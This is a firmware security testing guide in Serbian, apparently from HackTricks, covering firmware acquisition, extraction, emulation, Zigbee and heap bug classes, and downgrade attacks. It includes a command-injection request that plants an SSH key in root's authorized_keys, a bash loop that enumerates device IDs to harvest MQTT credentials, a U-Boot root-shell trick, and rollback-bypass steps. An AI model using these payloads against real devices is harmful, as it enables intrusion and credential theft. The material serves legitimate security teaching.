# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je esencijalni softver koji omogućava uređajima da ispravno rade tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici interaguju. Skladišti se u trajnoj memoriji, obezbeđujući da uređaj može da pristupi ključnim instrukcijama od trenutka kada se uključi, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalno modifikovanje firmware-a je kritičan korak u identifikaciji sigurnosnih ranjivosti.

## **Prikupljanje informacija**

**Prikupljanje informacija** je kritičan početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Hardverskom rasporedu i datasheet-ovima
- Metrikama codebase-a i lokacijama izvornog koda
- Eksternim bibliotekama i tipovima licenci
- Istoriji update-a i regulatornim sertifikacijama
- Arhitektonskim i flow dijagramima
- Bezbednosnim procenama i identifikovanim ranjivostima

U ovu svrhu, alati za **open-source intelligence (OSINT)** su neprocenjivi, kao i analiza svih dostupnih open-source softverskih komponenti kroz ručne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Pribavljanje firmware-a**

Do firmware-a se može doći različitim metodama, svaka sa svojim nivoom složenosti:

- **Direktno** od izvora (developeri, proizvođači)
- **Buildovanjem** iz dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih sajtova za podršku
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Direktnim pristupom **cloud storage**-u, uz alate kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **update-a** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** iz uređaja putem veza kao što su **UART**, **JTAG** ili **PICit**
- **Snifovanjem** update zahteva unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardcoded update endpoints**
- **Dumpovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i čitanjem** storage čipa, kada sve ostalo zakaže, uz odgovarajuće hardverske alate

### UART-only logs: force a root shell via U-Boot env in flash

Ako se UART RX ignoriše (samo logovi), i dalje možete da forsirate init shell tako što ćete **offline izmeniti U-Boot environment blob**:

1. Dumpujte SPI flash pomoću SOIC-8 clip-a + programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh`, i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na embedded uređajima gde je shell bootloader-a onemogućen, ali je env particija upisiva preko eksternog pristupa flash memoriji.

## Analiziranje firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izvučete informacije kako biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako ne pronađeš mnogo sa tim alatima, proveri **entropy** slike pomoću `binwalk -E <bin>`. Ako je entropy niska, verovatno nije enkriptovana. Ako je entropy visoka, verovatno je enkriptovana (ili kompresovana na neki način).

Takođe, možeš da koristiš ove alate za izdvajanje **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za inspekciju fajla.

### Getting the Filesystem

Sa prethodnim komentarisanim alatima kao što je `binwalk -ev <bin>` trebalo bi da si uspeo da **extract the filesystem**.\
Binwalk ga obično extract-uje unutar **foldera nazvanog po tipu filesystema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Ponekad, binwalk **neće imati magic byte filesystema u svojim signatures**. U tim slučajevima, koristi binwalk da **nađe offset filesystema i carve-uje compressed filesystem** iz binarnog fajla i **manualno extract-uje** filesystem prema njegovom tipu koristeći korake ispod.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokreni sledeću **dd command** za izdvajanje Squashfs filesystem-a.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, sledeća komanda se takođe može pokrenuti.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (koristi se u gornjem primeru)

`$ unsquashfs dir.squashfs`

Fajlovi će potom biti u direktorijumu "`squashfs-root`".

- CPIO archive fajlovi

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- Za ubifs filesystems sa NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza Firmware-a

Kada se firmware dobije, neophodno ga je analizirati kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces uključuje korišćenje različitih alata za analizu i izdvajanje vrednih podataka iz firmware image-a.

### Alati za početnu analizu

Daje se skup komandi za početni pregled binary fajla (nazvanog `<bin>`). Ove komande pomažu u identifikaciji tipova fajlova, izvlačenju strings, analizi binary podataka i razumevanju detalja o particijama i filesystem-u:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenilo stanje enkripcije slike, proverava se **entropy** pomoću `binwalk -E <bin>`. Niska entropy ukazuje na odsustvo enkripcije, dok visoka entropy ukazuje na moguću enkripciju ili kompresiju.

Za izvlačenje **embedded files**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju fajlova.

### Extracting the Filesystem

Koristeći `binwalk -ev <bin>`, obično se može izdvojiti filesystem, često u direktorijum nazvan po tipu filesystema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip filesystema zbog nedostajućih magic bytes, neophodno je ručno izdvajanje. To podrazumeva korišćenje `binwalk` za lociranje offset-a filesystema, a zatim komande `dd` za izdvajanje filesystema:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa filesystema (npr., squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza filesystema

Kada je filesystem izdvojen, počinje potraga za bezbednosnim propustima. Pažnja se posvećuje insecure network daemons, hardcoded credentials, API endpoints, update server funkcionalnostima, nekompajliranom kodu, startup skriptama i kompajliranim binarima za offline analizu.

**Ključne lokacije** i **stavke** za proveru uključuju:

- **etc/shadow** i **etc/passwd** za korisničke credentials
- SSL certificates i keys u **etc/ssl**
- Konfiguracione i skript fajlove za potencijalne vulnerabilities
- Ugrađene binarne fajlove za dalju analizu
- Uobičajene IoT device web servere i binarne fajlove

Nekoliko alata pomaže u otkrivanju osetljivih informacija i vulnerabilities unutar filesystema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu firmware analizu
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere na kompajliranim binarima

I source code i kompajlirani binari pronađeni u filesystemu moraju biti detaljno provereni na vulnerabilities. Alati poput **checksec.sh** za Unix binare i **PESecurity** za Windows binare pomažu da se identifikuju nezaštićeni binari koji bi mogli biti exploatovani.

## Prikupljanje cloud config i MQTT credentials preko izvedenih URL tokena

Mnogi IoT hubs preuzimaju svoju konfiguraciju po uređaju sa cloud endpoint-a koji izgleda ovako:

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom firmware analize možete otkriti da je `<token>` lokalno izveden iz device ID-ja pomoću hardcoded secret-a, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen kao uppercase hex

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruše URL i preuzme cloud config, često otkrivajući plaintext MQTT credentials i topic prefixes.

Praktični workflow:

1) Izvući deviceId iz UART boot logs

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tražite linije koje ispisuju cloud config URL pattern i broker address, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Povrati STATIC_KEY i token algoritam iz firmware

- Učitaj binarne fajlove u Ghidra/radare2 i potraži config putanju ("/pf/") ili MD5 upotrebu.
- Potvrdi algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedi token u Bash i pretvori digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupi cloud config i MQTT kredencijale

- Sastavi URL i povuci JSON pomoću curl; parsiraj sa jq da izdvojiš secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotrebi plaintext MQTT i slabe topic ACL-ove (ako su prisutni)

- Iskoristi recovered credentials da se pretplatiš na maintenance topics i tražiš sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeriraj predvidive device ID-jeve (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bajtove praćene sekvencijalnim sufiksom.
- Možeš iterirati kandidat ID-jeve, izvesti tokene i programatski preuzeti konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite eksplicitnu autorizaciju pre pokušaja mass enumeration.
- Kada je moguće, preferirajte emulation ili static analysis za oporavak secrets bez modifikovanja ciljnog hardvera.

Proces emulacije firmware omogućava **dynamic analysis** bilo rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog hardverskih ili arhitektonskih zavisnosti, ali prebacivanje root filesystem-a ili specifičnih binaries na uređaj sa odgovarajućom architecture i endianness, kao što je Raspberry Pi, ili na unapred napravljen virtual machine, može olakšati dalje testiranje.

### Emulating Individual Binaries

Za ispitivanje pojedinačnih programa, identifikovanje endianness programa i CPU architecture je ključno.

#### Example with MIPS Architecture

Za emulaciju binary-ja MIPS architecture, može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
I za instalaciju potrebnih alata za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian), koristi se `qemu-mips`, a za little-endian binarne fajlove, izbor bi bio `qemu-mipsel`.

#### ARM Architecture Emulation

Za ARM binarne fajlove, proces je sličan, uz korišćenje `qemu-arm` emulatora za emulaciju.

### Full System Emulation

Alati poput [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugih olakšavaju potpunu emulaciju firmware-a, automatizujući proces i pomažući u dinamičkoj analizi.

## Dynamic Analysis in Practice

U ovoj fazi, za analizu se koristi ili stvarno ili emulirano okruženje uređaja. Neophodno je održavati shell pristup OS-u i filesystem-u. Emulacija možda neće savršeno oponašati hardverske interakcije, pa su povremeni restartovi emulacije potrebni. Analiza treba da ponovo pregleda filesystem, exploituje izložene veb stranice i network servise, i istraži ranjivosti bootloader-a. Testovi integriteta firmware-a su ključni za identifikovanje potencijalnih backdoor ranjivosti.

## Runtime Analysis Techniques

Runtime analysis podrazumeva interakciju sa procesom ili binarnim fajlom u njegovom operativnom okruženju, koristeći alate kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoints i identifikovanje ranjivosti kroz fuzzing i druge tehnike.

Za embedded ciljeve bez punog debugger-a, **kopirajte statički linkovani `gdbserver`** na uređaj i povežite se remote:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor mapiranje poruka

Na IoT hub-ovima RF stack je često podeljen između **radio MCU** i Linux userland procesa. Koristan workflow je da mapiraš putanju:

1. **RF frame** na vazduhu
2. **controller-side parser** na radio MCU
3. **serial/UART text or TLV protocol** prosleđen ka Linux-u (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemon-u
5. **protocol-specific handler / state machine**

Ova arhitektura stvara dve reversing mete umesto jedne. Ako controller pretvara binarne radio frame-ove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, izdvoji:

- **message groups** i dispatch table
- Koje poruke mogu da dođu sa **network** naspram samog controller-a
- Tačna **manufacturer-specific discriminator fields** (na primer Zigbee `manufacturer_code` i custom `cluster_command`)
- Koji handler-i su dostupni samo tokom **commissioning**, discovery, ili firmware/model download faza

Za Zigbee posebno, uhvati pairing traffic i proveri da li target i dalje koristi default **Link Key** `ZigBeeAlliance09`. Ako da, sniffing commissioning traffic može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeleži da li testirani uređaj to stvarno sprovodi.

### Manufacturer-specific protocol handlers i FSM-gated reachability

Vendor-specific Zigbee/ZCL komande su često bolji target od standardizovanih cluster-a jer hrane **custom parsing code** i interne **FSMs** sa manje testiranom validacijom.

Praktični workflow:

- Reverse-uj command dispatcher dok ne nađeš **vendor-only handler**.
- Izdvoji **FSM state**, **event**, **check**, **action**, i **next-state** table.
- Identifikuj **transitional states** koji auto-advance i retry/error grane koje na kraju resetuju ili oslobađaju attacker-controlled state.
- Potvrdi koji su legitimni protocol exchange-ovi potrebni da bi se daemon doveo u ranjivo stanje, umesto da pretpostaviš da je buggy handler uvek dostupan.

Za protocols osetljive na timing, packet replay iz Python framework-a može biti prespor. Pouzdaniji pristup je emulacija legitimnog uređaja na real hardware-u (na primer **nRF52840**) sa vendor-grade stack-om, tako da možeš da izložiš tačne **endpoints**, **attributes**, i commissioning timing.

### Klasa bug-a: fragmented-download u embedded daemon-ima

Ponavljajuća firmware bug klasa pojavljuje se u **fragmented blob/model/configuration downloads**:

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo attacker-controlled **packet-local** polja kao što su `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **original allocated size**.

Ovo omogućava napadaču da pošalje:

- Prvi validan fragment sa **malim** deklarisanim total size da bi forsirao malu heap alokaciju.
- Kasniji fragment sa **očekivanim offset** ali većim `chunk_len`.
- Forged packet-local size koji zadovoljava nove provere dok i dalje overflow-uje originalno alocirani buffer.

Kada se ranjiva putanja nalazi iza commissioning logike, exploitation mora da uključi dovoljno **device emulation** da bi se target doveo u očekivani model-download ili blob-download state pre slanja malformiranih fragmenata.

### Protocol-driven `free()` triggers

U embedded daemon-ima, najlakši način da se pokrene heap metadata exploitation često nije "čekaj cleanup" već **forsiraj protocol-ovo sopstveno error handling**:

- Pošalji malformirane follow-up fragmente da bi FSM prešao u **retry** ili **error** state.
- Prekorači retry threshold tako da daemon **resets context** i oslobađa korumpirani buffer.
- Iskoristi ovaj predvidivi `free()` da bi pokrenuo allocator-side primitive pre nego što process padne iz nepovezanih razloga.

Ovo je posebno korisno protiv **musl/uClibc/dlmalloc-like** allocator-a u embedded Linux-u, gde korupcija chunk metadata može da pretvori unlink/unbin logic u write primitive. Stabilan obrazac je da se korumpira **size field** kako bi se traversal allocator-a preusmerio u **fake chunks staged inside the overflowed buffer**, umesto da se odmah pregaze real bin pointers i proces sruši.

## Binary Exploitation i Proof-of-Concept

Razvijanje PoC-a za identifikovane ranjivosti zahteva duboko razumevanje target arhitekture i programiranje u nižim jezicima. Binary runtime protections u embedded sistemima su retke, ali kada postoje, tehnike poput Return Oriented Programming (ROP) mogu biti neophodne.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slične glibc-u. Kasnija velika alokacija može da pokrene `__malloc_consolidate()`, pa svaki fake chunk mora da prođe provere (sane size, `fd = 0`, i okolni chunk-ovi viđeni kao "in use").
- **Non-PIE binaries under ASLR:** ako je ASLR uključen ali je glavni binary **non-PIE**, in-binary `.data/.bss` adrese su stabilne. Možeš da targetiraš region koji već liči na validan heap chunk header da bi fastbin alokaciju spustio na **function pointer table**.
- **Parser-stopping NUL:** kada se JSON parsira, `\x00` u payload-u može da zaustavi parsiranje dok trailing attacker-controlled bytes ostaju za stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()`, i `write()` može da postavi executable shellcode u poznat mapping i skoči na njega.

## Prepared Operating Systems for Firmware Analysis

Operating systems kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prekonfigurisana okruženja za firmware security testing, opremljena potrebnim alatima.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da ti pomogne da radiš security assessment i penetration testing Internet of Things (IoT) uređaja. Štedi ti mnogo vremena tako što obezbeđuje prekonfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system baziran na Ubuntu 18.04 sa unapred učitanim firmware security testing alatima.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Čak i kada vendor implementira cryptographic signature checks za firmware images, **version rollback (downgrade) protection je često izostavljena**. Kada boot- ili recovery-loader samo proverava signature sa embedded public key-em, ali ne poredi *version* (ili monotonic counter) slike koja se flash-uje, napadač može legitimno da instalira **stariji, ranjivi firmware koji i dalje nosi validan signature** i tako ponovo uvede popravljene ranjivosti.

Tipičan attack workflow:

1. **Obezbedi stariji signed image**
* Preuzmi ga sa vendor-ovog javnog download portala, CDN-a ili support sajta.
* Izvuci ga iz companion mobile/desktop aplikacija (npr. unutar Android APK-a pod `assets/firmware/`).
* Preuzmi ga iz third-party repozitorijuma kao što su VirusTotal, Internet archives, forumi, itd.
2. **Uploaduj ili serviraј image uređaju** preko bilo kog exposed update channel-a:
* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoints koji prihvataju Base64-encoded firmware blobs, dekodiraju ih server-side i pokreću recovery/upgrade.
3. Posle downgrade-a, iskoristi ranjivost koja je popravljena u novijem izdanju (na primer command-injection filter koji je kasnije dodat).
4. Opcionalno flash-uj najnoviju verziju nazad ili onemogući update-ove da bi izbegao detekciju nakon što se postigne persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmware-u, `md5` parametar se direktno konkatenira u shell command bez sanitisation-a, što omogućava injection proizvoljnih komandi (ovde – enabling SSH key-based root access). Kasnije verzije firmware-a su uvele osnovni character filter, ali odsustvo downgrade protection čini tu ispravku besmislenom.

### Extracting Firmware From Mobile Apps

Mnogi vendor-i pakuju kompletne firmware image-e unutar svojih pratećih mobile application-a kako bi app mogao da ažurira uređaj preko Bluetooth/Wi-Fi. Ovi paketi se obično čuvaju nešifrovani u APK/APEX pod putanjama kao što su `assets/fw/` ili `res/raw/`. Alati poput `apktool`, `ghidra`, ili čak običan `unzip` omogućavaju vam da izvučete signed image-e bez diranja fizičkog hardware-a.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback samo u updater-u u A/B slot dizajnima

Neki vendori zaista implementiraju anti-downgrade **ratchet**, ali samo unutar *updater* logike (na primer UDS rutina preko CAN-a, recovery komanda, ili userspace OTA agent). Ako **bootloader** kasnije proverava samo image signature/CRC i veruje partition table ili slot metadata, rollback zaštita i dalje može da se zaobiđe.

Tipičan slab dizajn:

- Firmware metadata sadrži i descriptor verzije i **security ratchet** / monotoni brojač.
- Updater poredi image ratchet sa vrednošću sačuvanom u persistent storage i odbacuje starije potpisane slike.
- Bootloader ne parsira taj ratchet i samo verifikuje header, CRC i signature pre bootovanja izabranog slota.
- Aktivacija slota se čuva odvojeno u partition table ili po-slot generation counter i **nije kriptografski vezana** za tačan firmware digest koji je validiran.

Ovo stvara **validate-one-image / boot-another-image** primitiv u dual-slot sistemima. Ako napadač može da natera updater da označi slot B kao sledeći boot target pomoću trenutne potpisane slike, a kasnije može da prepiše slot B pre reboot-a, bootloader i dalje može da butuje downgraded image jer veruje samo već potvrđenoj slot metadata.

Uobičajen obrazac zloupotrebe:

1. Uploaduj **trenutnu potpisanu** firmware u pasivni slot i pokreni normalnu validation/switch rutinu tako da layout označi taj slot kao sledeći aktivni.
2. **Još ne rebootuj**. Ponovo uđi u rutinu za pripremu/brisanje slota u istoj sesiji.
3. Zloupotrebi stale boot-state ili stale slot-selection logiku tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upiši **stariji ali i dalje potpisan** firmware u taj slot.
5. Preskoči validation rutinu koja primenjuje ratchet i rebootuj direktno.
6. Bootloader bira promovisan slot, proverava samo signature/integrity i butuje staru sliku.

Stvari na koje treba obratiti pažnju pri reverziranju A/B update implementacija:

- Slot selection izveden iz **boot-time flags** koji se ne osvežavaju posle uspešnog switch-a.
- `prepare_passive_slot()`-stil rutina koja briše slot na osnovu stale state umesto na osnovu **current committed layout**.
- `part_write_layout()`-stil funkcija koja samo uvećava **generation counter** / active flag i ne čuva validirani image hash.
- Ratchet provere implementirane u userspace ili updater kodu, ali **ne** u ROM / bootloader / secure boot fazama.
- Rutine za brisanje ili recovery koje ostavljaju slot označen kao bootable čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Checklist za procenu update logike

* Da li su transport/authentication *update endpoint*-a adekvatno zaštićeni (TLS + authentication)?
* Da li uređaj poredi **version numbers** ili **monotonic anti-rollback counter** pre flashovanja?
* Da li je image verifikovan unutar secure boot chain-a (npr. signatures proverene od strane ROM koda)?
* Da li **bootloader** primenjuje isti ratchet kao updater, umesto da proverava samo signature/CRC?
* Da li je slot activation metadata **vezana za validirani firmware digest/version**, ili slot može da se menja posle promotion?
* Nakon uspešnog slot switch-a, da li je uređaj primoran na reboot ili su kasnije update/erase rutine i dalje dostupne u istoj sesiji?
* Da li userland kod radi dodatne sanity checks (npr. dozvoljeni partition map, model number)?
* Da li *partial* ili *backup* update flow-ovi ponovo koriste istu validation logiku?

> 💡  Ako nešto od gore navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Vulnerable firmware za vežbu

Za vežbu otkrivanja vulnerabilities u firmware-u, koristi sledeće vulnerable firmware projekte kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
